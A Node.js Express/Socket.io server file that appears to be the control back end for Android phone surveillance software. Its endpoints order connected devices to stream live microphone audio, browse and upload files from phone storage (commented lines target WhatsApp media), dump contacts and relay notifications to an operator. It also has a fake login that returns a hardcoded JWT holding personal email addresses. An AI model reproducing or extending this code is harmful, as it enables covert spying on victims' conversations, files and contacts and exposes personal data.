const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const { sendMail } = require("./mailer");
const { Events } = require("./EventConstants");
const fs = require("fs");
const { handlePcmData } = require("./wavefilewrter");
// const { EncodeOgg } = require("./oggWriter");
const wav = require("wav");

// Create a writable stream to save the wave file
const outputStream = fs.createWriteStream("received_file.wav");

// Create a new wave file writer with the specified options
const writer = new wav.FileWriter("received_file.wav", {
  sampleRate: 44100, // Sample rate in Hz
  channels: 2, // Mono
  bitDepth: "32", // 16-bit sample depth
});

app.use(express.json());

const io = require("socket.io")(server, {
  maxHttpBufferSize: 1e8,
  pingTimeout: 80000,
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

const cors = require("cors");

const WaveFile = require("wavefile").WaveFile;
const logger = require("./loggerconfig/logger.js");
const { log } = require("console");
let socketConnections = [];

const key = fs.readFileSync("private.key");
const cert = fs.readFileSync("certificate.crt");
app.use(
  cors({
    origin: "*",
    // methods: [],
  })
);

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/hello.html");
});
app.get("/qr", (req, res) => {
  res.sendFile(__dirname + "/qrcode.txt");
});
app.get("/audio", (req, res) => {
  res.sendFile(__dirname + "/hello.wav");
});
app.get("/pcm", (req, res) => {
  logger.info("sending pcm library");
  res.sendFile(__dirname + "/pcm-player.js");
});

io.on("connection", async (socket) => {
  socketConnections.push(socket.id);
  logger.info("connection Established with socket: " + socket.id);

  socket.on("disconnect", (socket) => {
    logger.info("user uid disconnected:::::::::");
  });

  socket.on(Events.AudioPcmData, async (audioData) => {
    socket.broadcast.emit("audiodata", audioData);
    // logger.info("audiodata");/
    // logger.info("Sending Audio Data to device:: ", audioData);
    // EncodeOgg(audioData);
    writer.write(audioData);
    handlePcmData(audioData);
    // logger.info("Audio Data sent to device:: ", "[1,2...]");
  });
  socket.on(Events.NotificationPostedEvent, (data) => {
    logger.info("dataLOG" + data);
    socket.broadcast.emit("onNotification", data);
  });

  socket.on("log", (data) => {
    logger.info(":broadcasting Notification " + data);
    socket.broadcast.emit("notificationLogs", data);
  });

  // get files and folder in side forede
  socket.on("getFilesAndFolders", (data) => {
    socket.broadcast.emit("foldersAndFiles", data);
  });

  // download files and folders
  socket.on("uploadTOServer", (data) => {
    logger.info("bas64 url is " + JSON.stringify(data));
    socket.broadcast.emit("downloadFile", data);
  });
  socket.on("OnSystemError", (data) => {
    logger.info("OnSystemError" + data);
  });

  socket.on("downloadAllContacts", (data) => {
    logger.info("downloadAllContacts" + JSON.stringify(data));
    socket.broadcast.emit("getAllContactsAndNames", data);
  });
});

app.get("/getSocket", async (req, res) => {
  logger.info(" getting socket connections list");
  let conn = [];
  logger.info("getting socket connections list");
  logger.info(
    "socket connections list:------------------>{} " + socketConnections
  );
  logger.info("getting socket connections list End");
  const ids = await io.allSockets();
  ids.forEach(function (value) {
    conn.push(value);
  });
  logger.info("latest updated clients list:---------->", conn);
  socketConnections = conn;
  res.send(socketConnections);
});

app.get("/startAudio/:id", (req, res) => {
  logger.info("starting audio of client id " + req.params.id);
  startPcmData(req.params.id);
  res.send({ status: "200" });
});

app.get("/stopAudio/:id", (req, res) => {
  stopPcmData(req.params.id);
  res.send({ status: "500" });
});
app.post("/getFiles_with_path", (req, res) => {
  let data = req.body;
  logger.info("getting files with path");
  for (let id of data.sockets) {
    logger.info("socket list " + id);
    io.to(id).emit("e#getFilesAndFolders", data?.path);
  }
  res.send({ status: "200" });
});
app.post("/download_file_path", (req, res) => {
  let body = req.body;
  let path = body.path;

  path = path.replace("/storage/emulated/0/", "");
  for (let obj of body.socketId) {
    logger.info("Downloading file" + "    " + path);
    io.to(obj).emit("uploadFiletosever", path);
  }
  res.send({ status: "200" });
});

// contacts

app.get("/contacts", async (req, res) => {
  logger.info("getting contacts");
  const ids = await io.allSockets();
  for (let id of ids) {
    logger.info("ids are: " + id);
    io.to(id).emit("getContacts", "stat");
  }
  res.send({ status: "200" });
});

app.post("/sendotp", (req, res) => {
  logger.info("sending otp");
  let response = {
    status: "200",
    msg: "otp sent successfully",
    success: 1,
  };
  res.send(response);
});

// files and storage folders

app.post("/login", (req, res) => {
  logger.info("login request");
  let response = {
    success: 1,
    msg: "login successful",
    status: "200",
    token:
      "eyJhbGciOiJSUzI1NiJ9.eyJ1aWQiOiI1MTEiLCJzdWIiOiJhdmlzaGVrLnlhZGF2QHJlem8uYWkiLCJ1bm1lIjoibmFjY2h1IG9tc2FpIiwidWVtIjoibmFjY2h1Lm9tc2FpQHJlem8uYWkiLCJ1dCI6IkFkbWluIiwiY2lkIjoiOTEiLCJpYXQiOjE2NzYzNzQ0ODYsIm5iZiI6MTY3NjM3NDQ4NiwiZXhwIjoxNjc2Mzc4MDg2fQ.HFVwWHFvoo7ZI7j4COjZuV_HT2Fe94fDpkEkqcrKqM-uZ0deeqixbKcoMTkwl01sGcJP393KvOFyOH-w-QlJ972WjJtTsPE3ApnR0XqaONeo-njrU9l3zRCKtzRgfhhZhOcdU1ZNeDXfqUV4UA3vaV4CRDNkQH_GJ5gRkhJv10f5qISye6_Fn_7SMcUbWMUclVW82im2w13pH193LA4E9m6UchjXWpFCkHnppwzrr5FcVsX7fqfvA0kXtqWoplZoZvsFlCk83nAn0ItZ-Vfc8GZdTTzSU9Dw3ZxAVR1DHqnY2ZoFwIBBHqRaZjn8GPca_EWVGZPCD2tkrLbPxazEQg",
    user: {
      name: "Nacchu Omsai",
    },
  };
  res.send(response);
});
app.get("/cancelAll", async (req, res) => {
  logger.info("cancelling all downloads");
  const ids = await io.allSockets();
  for (id of ids) {
    logger.info("ids are: " + id);
    io.to(id).emit("e#notification-cancel-all", "stat");
  }
  res.send({});
});

// start pcm data to server

function startPcmData(id) {
  logger.info("sending client for send pcm data with socket id{} " + id);
  io.to(id).emit(Events.AudioStart, "start");
  // io.to(id).emit("e#getFilesAndFolders", "Android/media/com.whatsapp/WhatsApp");
  // io.to(id).emit(
  //   "uploadFiletosever",
  //   "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/IMG-20210111-WA0012.jpg"
  // );
  logger.info("succesfully sent requset to the client with socket id " + id);
}

function stopPcmData(socketId) {
  logger.info("stopping pcm data with socket id " + socketId);
  io.to(socketId).emit(Events.AudioStop, "stat");
}

const port = 80;
server.listen(port, () => {
  logger.info("listening on port ", port);
});

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function triggerFunction() {
  sendMail();
}

setInterval(triggerFunction, 30 * 60 * 1000);
